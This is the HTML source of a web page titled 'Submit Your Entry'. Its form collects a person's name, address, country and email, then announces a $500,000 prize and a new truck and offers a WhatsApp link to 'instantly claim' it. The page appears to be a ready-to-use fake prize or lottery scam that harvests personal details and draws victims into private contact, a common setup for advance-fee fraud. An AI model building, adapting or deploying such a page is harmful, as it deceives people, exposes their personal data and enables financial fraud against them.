<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Submit Entry</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet" />
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #0b1120;
            padding: 24px;
        }

        .card {
            max-width: 700px;
            width: 100%;
            background: rgba(255, 255, 255, 0.06);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.10);
            border-radius: 32px;
            padding: 40px;
            color: #fff;
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6);
        }

        .card-header {
            display: flex;
            align-items: center;
            gap: 14px;
            margin-bottom: 28px;
        }

        .card-header i {
            font-size: 30px;
            color: #7c3aed;
        }

        .card-header h1 {
            font-size: 28px;
            font-weight: 700;
            letter-spacing: -0.3px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            font-weight: 600;
            font-size: 14px;
            color: rgba(255, 255, 255, 0.6);
            margin-bottom: 6px;
            letter-spacing: 0.2px;
        }

        .form-group input,
        .form-group textarea {
            width: 100%;
            padding: 12px 16px;
            background: rgba(255, 255, 255, 0.07);
            border: 1px solid rgba(255, 255, 255, 0.12);
            border-radius: 14px;
            color: #fff;
            font-family: 'Inter', sans-serif;
            font-size: 15px;
            transition: border-color 0.25s, background 0.25s;
            outline: none;
        }

        .form-group input:focus,
        .form-group textarea:focus {
            border-color: #7c3aed;
            background: rgba(255, 255, 255, 0.10);
        }

        .form-group input::placeholder,
        .form-group textarea::placeholder {
            color: rgba(255, 255, 255, 0.25);
        }

        .form-group textarea {
            min-height: 80px;
            resize: vertical;
        }

        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
        }

        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            padding: 14px 32px;
            border-radius: 16px;
            font-weight: 600;
            font-size: 16px;
            border: none;
            cursor: pointer;
            transition: all 0.25s;
            font-family: 'Inter', sans-serif;
            width: 100%;
        }

        .btn-primary {
            background: #7c3aed;
            color: #fff;
        }

        .btn-primary:hover {
            background: #6d28d9;
            transform: translateY(-1px);
            box-shadow: 0 8px 30px rgba(124, 58, 237, 0.35);
        }

        .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .btn-outline {
            background: rgba(255, 255, 255, 0.08);
            color: rgba(255, 255, 255, 0.7);
            border: 1px solid rgba(255, 255, 255, 0.12);
        }

        .btn-outline:hover {
            background: rgba(255, 255, 255, 0.15);
            color: #fff;
        }

        .btn-whatsapp {
            background: #25D366;
            color: #fff;
        }

        .btn-whatsapp:hover {
            background: #1ebe5c;
            transform: translateY(-1px);
            box-shadow: 0 8px 30px rgba(37, 211, 102, 0.35);
        }

        .btn-group {
            display: flex;
            gap: 12px;
            margin-top: 8px;
        }

        .btn-group .btn {
            flex: 1;
        }

        .success-box {
            display: none;
            text-align: center;
            padding: 20px 0 10px;
        }

        .success-box.show {
            display: block;
            animation: fadeUp 0.6s ease;
        }

        @keyframes fadeUp {
            0% {
                opacity: 0;
                transform: translateY(20px);
            }
            100% {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .success-box .trophy {
            font-size: 60px;
            color: #f59e0b;
            margin-bottom: 12px;
            display: block;
        }

        .success-box h2 {
            font-size: 28px;
            font-weight: 700;
            background: linear-gradient(135deg, #fbbf24, #f59e0b);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 8px;
        }

        .success-box .sub-text {
            font-size: 18px;
            font-weight: 500;
            color: rgba(255, 255, 255, 0.85);
            margin-bottom: 16px;
        }

        .success-box .prize-amount {
            font-size: 32px;
            font-weight: 700;
            color: #fbbf24;
            margin: 8px 0;
        }

        .success-box .prize-truck {
            font-size: 20px;
            font-weight: 600;
            color: rgba(255, 255, 255, 0.9);
            margin-bottom: 20px;
        }

        .success-box .prize-truck i {
            color: #7c3aed;
            margin-right: 8px;
        }

        .success-box .claim-link {
            display: inline-block;
            padding: 16px 40px;
            background: #25D366;
            color: #fff;
            border-radius: 16px;
            font-weight: 700;
            font-size: 18px;
            text-decoration: none;
            transition: all 0.25s;
            margin-top: 8px;
        }

        .success-box .claim-link:hover {
            background: #1ebe5c;
            transform: scale(1.02);
            box-shadow: 0 8px 30px rgba(37, 211, 102, 0.35);
        }

        .success-box .claim-link i {
            margin-right: 10px;
        }

        .divider {
            border: none;
            border-top: 1px solid rgba(255, 255, 255, 0.08);
            margin: 24px 0;
        }

        .view-section {
            margin-top: 16px;
            padding-top: 16px;
            border-top: 1px solid rgba(255, 255, 255, 0.06);
        }

        .view-section .btn {
            width: 100%;
        }

        .form-status {
            margin-top: 12px;
            padding: 12px 16px;
            border-radius: 12px;
            font-weight: 500;
            font-size: 14px;
            display: none;
        }

        .form-status.error {
            display: block;
            background: rgba(239, 68, 68, 0.20);
            color: #f87171;
            border: 1px solid rgba(239, 68, 68, 0.25);
        }

        .form-status.success {
            display: block;
            background: rgba(16, 185, 129, 0.20);
            color: #34d399;
            border: 1px solid rgba(16, 185, 129, 0.25);
        }

        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .modal-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(8px);
            align-items: center;
            justify-content: center;
            z-index: 1000;
            padding: 20px;
        }

        .modal-overlay.show {
            display: flex;
            animation: fadeIn 0.25s ease;
        }

        @keyframes fadeIn {
            0% {
                opacity: 0;
            }
            100% {
                opacity: 1;
            }
        }

        .modal-box {
            background: #1a1f2e;
            border-radius: 28px;
            padding: 36px 32px;
            max-width: 420px;
            width: 100%;
            border: 1px solid rgba(255, 255, 255, 0.08);
            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.6);
        }

        .modal-box h3 {
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 6px;
        }

        .modal-box p {
            color: rgba(255, 255, 255, 0.5);
            font-size: 14px;
            margin-bottom: 20px;
        }

        .modal-box input {
            width: 100%;
            padding: 14px 18px;
            background: rgba(255, 255, 255, 0.07);
            border: 1px solid rgba(255, 255, 255, 0.12);
            border-radius: 14px;
            color: #fff;
            font-family: 'Inter', sans-serif;
            font-size: 15px;
            outline: none;
            margin-bottom: 16px;
        }

        .modal-box input:focus {
            border-color: #7c3aed;
            background: rgba(255, 255, 255, 0.10);
        }

        .modal-box .modal-actions {
            display: flex;
            gap: 12px;
        }

        .modal-box .modal-actions .btn {
            flex: 1;
            padding: 12px 20px;
            font-size: 15px;
        }

        .modal-box .modal-actions .btn-cancel {
            background: rgba(255, 255, 255, 0.08);
            color: rgba(255, 255, 255, 0.6);
        }

        .modal-box .modal-actions .btn-cancel:hover {
            background: rgba(255, 255, 255, 0.15);
            color: #fff;
        }

        .modal-box .modal-actions .btn-go {
            background: #7c3aed;
            color: #fff;
        }

        .modal-box .modal-actions .btn-go:hover {
            background: #6d28d9;
        }

        @media (max-width: 600px) {
            .card {
                padding: 24px 18px;
            }

            .card-header h1 {
                font-size: 22px;
            }

            .form-row {
                grid-template-columns: 1fr;
                gap: 0;
            }

            .btn-group {
                flex-direction: column;
            }

            .success-box h2 {
                font-size: 22px;
            }

            .success-box .prize-amount {
                font-size: 26px;
            }

            .modal-box {
                padding: 28px 20px;
            }

            .modal-box .modal-actions {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>

    <div class="card" id="app">
        <!-- header -->
        <div class="card-header">
            <i class="fas fa-pen-to-square"></i>
            <h1>Submit Your Entry</h1>
        </div>

        <!-- ─── FORM ─── -->
        <form id="submissionForm" novalidate>
            <div class="form-group">
                <label for="fullName">Full Name</label>
                <input type="text" id="fullName" placeholder="e.g. John Doe" required />
            </div>

            <div class="form-group">
                <label for="address">Address</label>
                <textarea id="address" placeholder="Street, city, postal code" required></textarea>
            </div>

            <div class="form-row">
                <div class="form-group">
                    <label for="country">Country</label>
                    <input type="text" id="country" placeholder="e.g. United States" required />
                </div>
                <div class="form-group">
                    <label for="countyCode">County Code</label>
                    <input type="text" id="countyCode" placeholder="e.g. US-CA" required />
                </div>
            </div>

            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" placeholder="you@example.com" required />
            </div>

            <div id="formStatus" class="form-status"></div>

            <button type="submit" class="btn btn-primary" id="submitBtn">
                <i class="fas fa-paper-plane"></i> Submit Entry
            </button>
        </form>

        <!-- ─── SUCCESS / CONGRATULATIONS ─── -->
        <div class="success-box" id="successBox">
            <span class="trophy">🏆</span>
            <h2>CONGRATULATIONS!</h2>
            <p class="sub-text">You have been successfully verified.</p>
            <div class="prize-amount">$500,000.00</div>
            <div class="prize-truck">
                <i class="fas fa-truck"></i> + A NEW BRAND TRUCK
            </div>
            <p style="color: rgba(255,255,255,0.5); font-size: 14px; margin: 12px 0 18px;">
                (Five Hundred Thousand Dollars)
            </p>
            <a href="#" class="claim-link" id="whatsappLink">
                <i class="fab fa-whatsapp"></i> Click here to instantly claim
            </a>
        </div>

        <hr class="divider" />

        <!-- ─── VIEW SECTION ─── -->
        <div class="view-section">
            <button class="btn btn-outline" id="viewBtn">
                <i class="fas fa-eye"></i> View Submission
            </button>
            <p style="color: rgba(255,255,255,0.25); font-size: 13px; text-align: center; margin-top: 12px;">
                Already submitted? Enter your ID to check your details.
            </p>
        </div>
    </div>

    <!-- ─── MODAL (ID prompt) ─── -->
    <div class="modal-overlay" id="idModal">
        <div class="modal-box">
            <h3><i class="fas fa-search" style="color: #7c3aed; margin-right: 8px;"></i> View Submission</h3>
            <p>Enter the submission ID to view your details.</p>
            <input type="text" id="modalIdInput" placeholder="e.g. 12345" autofocus />
            <div class="modal-actions">
                <button class="btn btn-cancel" id="modalCancelBtn">Cancel</button>
                <button class="btn btn-go" id="modalGoBtn">
                    <i class="fas fa-arrow-right"></i> View
                </button>
            </div>
        </div>
    </div>

    <script>
        (function() {
            // ─── DOM refs ───
            const form = document.getElementById('submissionForm');
            const submitBtn = document.getElementById('submitBtn');
            const formStatus = document.getElementById('formStatus');
            const successBox = document.getElementById('successBox');
            const viewBtn = document.getElementById('viewBtn');
            const modal = document.getElementById('idModal');
            const modalIdInput = document.getElementById('modalIdInput');
            const modalCancelBtn = document.getElementById('modalCancelBtn');
            const modalGoBtn = document.getElementById('modalGoBtn');
            const whatsappLink = document.getElementById('whatsappLink');

            // ─── helpers ───
            function setStatus(message, type) {
                formStatus.textContent = message;
                formStatus.className = 'form-status ' + type;
            }

            function clearStatus() {
                formStatus.textContent = '';
                formStatus.className = 'form-status';
            }

            function showSuccess() {
                form.style.display = 'none';
                successBox.classList.add('show');
            }

            function resetForm() {
                form.reset();
                clearStatus();
                submitBtn.disabled = false;
                submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Entry';
            }

            // ─── form submission ───
            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                clearStatus();

                // gather data
                const fullName = document.getElementById('fullName').value.trim();
                const address = document.getElementById('address').value.trim();
                const country = document.getElementById('country').value.trim();
                const countyCode = document.getElementById('countyCode').value.trim();
                const email = document.getElementById('email').value.trim();

                // basic validation
                if (!fullName || !address || !country || !countyCode || !email) {
                    setStatus('Please fill in all required fields.', 'error');
                    return;
                }

                // email format
                if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
                    setStatus('Please enter a valid email address.', 'error');
                    return;
                }

                // prepare JSON payload (no image)
                const payload = {
                    fullName,
                    address,
                    country,
                    countyCode,
                    email
                };

                submitBtn.disabled = true;
                submitBtn.innerHTML = '<span class="loading-spinner"></span> Submitting…';

                try {
                    const response = await fetch('/api/submit', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(payload),
                    });

                    if (!response.ok) {
                        const errText = await response.text();
                        throw new Error(errText || `Server error (${response.status})`);
                    }

                    const data = await response.json();

                    // update WhatsApp link with a custom message
                    const phone = '1234567890'; // replace with actual number
                    const msg = encodeURIComponent(
                        `I just claimed my $500,000 prize! 🎉\nSubmission ID: ${data.id || 'N/A'}`
                    );
                    whatsappLink.href = `https://wa.me/${phone}?text=${msg}`;

                    showSuccess();
                    setStatus('✅ Form submitted successfully!', 'success');

                } catch (err) {
                    console.error('Submit error:', err);
                    setStatus('❌ ' + (err.message || 'Submission failed. Please try again.'), 'error');
                    submitBtn.disabled = false;
                    submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Entry';
                }
            });

            // ─── view button → show modal ───
            viewBtn.addEventListener('click', function() {
                modal.classList.add('show');
                modalIdInput.value = '';
                modalIdInput.focus();
            });

            // ─── modal actions ───
            function closeModal() {
                modal.classList.remove('show');
            }

            modalCancelBtn.addEventListener('click', closeModal);

            modal.addEventListener('click', function(e) {
                if (e.target === modal) closeModal();
            });

            modalGoBtn.addEventListener('click', function() {
                const id = modalIdInput.value.trim();
                if (!id) {
                    modalIdInput.style.borderColor = '#ef4444';
                    setTimeout(() => { modalIdInput.style.borderColor = ''; }, 800);
                    return;
                }
                // navigate to view.html with id
                window.location.href = `view.html?id=${encodeURIComponent(id)}`;
            });

            modalIdInput.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') {
                    modalGoBtn.click();
                }
                if (e.key === 'Escape') {
                    closeModal();
                }
            });

            document.addEventListener('keydown', function(e) {
                if (e.key === 'Escape' && modal.classList.contains('show')) {
                    closeModal();
                }
            });

        })();
    </script>

</body>
</html>
